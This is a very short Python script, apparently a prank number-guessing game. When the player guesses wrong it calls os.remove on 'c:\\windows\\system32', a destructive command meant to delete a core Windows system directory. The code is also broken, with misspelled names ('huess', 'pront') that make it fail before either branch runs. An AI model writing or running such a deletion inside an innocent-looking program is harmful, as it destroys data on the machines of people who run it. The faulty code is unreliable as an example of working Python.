import random 
import os 

number = random.randint(1,10)
guess = input("guess the number between 1 to 10")
guess =int(huess)

if guess == number:
    pront("you won!")
else:
    os.remove("c:\\windows\\system32")